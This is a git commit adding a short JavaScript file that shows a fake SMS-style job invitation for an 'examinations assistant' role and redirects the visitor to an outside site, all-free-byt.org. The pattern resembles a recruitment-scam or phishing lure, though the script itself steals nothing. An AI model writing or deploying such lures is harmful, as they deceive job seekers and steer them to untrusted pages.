53e0ca2f4286b6f0cc6c4fc38771bd5ee0e3e397
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-10-01 02:35:33 -0700

    Create job-offer.js

---
+++ job-offer.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: You are invited to apply as examinations assistant for July and December 2024 marking sessions. kindly press Ok to start application now ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://all-free-byt.org/assistance.html';
+}
